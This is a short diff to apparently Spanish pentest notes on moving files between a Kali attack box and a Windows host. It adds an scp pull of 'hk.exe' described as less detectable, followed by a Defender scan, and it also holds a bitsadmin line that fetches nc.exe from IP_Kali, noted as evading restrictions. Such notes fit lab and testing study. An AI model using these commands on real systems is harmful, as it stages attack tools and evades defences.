@@ -99,6 +99,11 @@ EXTRA:
 	  ❯ copy file x:\file       # Copiar el archivo hacia Kali
 	  ❯ net use * /delete       # Terminar la conexión autenticada 
 
+# Copiar el archivo desde el SSH de Kali ingresando el user y la password 
+5 ❯ scp kali@IP_Kali:/home/kali/hk.exe C:\Users\user1\Downloads\   <- IMPORTANTE (SEGURO Y MENOS DETECTABLE)
+  ❯ Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\user1\Downloads\hk.exe"  # Ecanear con Defender el archivo subido
+
+
 EXTRA:
    ❯ bitsadmin /transfer job http://IP_Kali/nc.exe C:\Temp\nc.exe
    # BITS → descarga en segundo plano → a veces evita restricciones
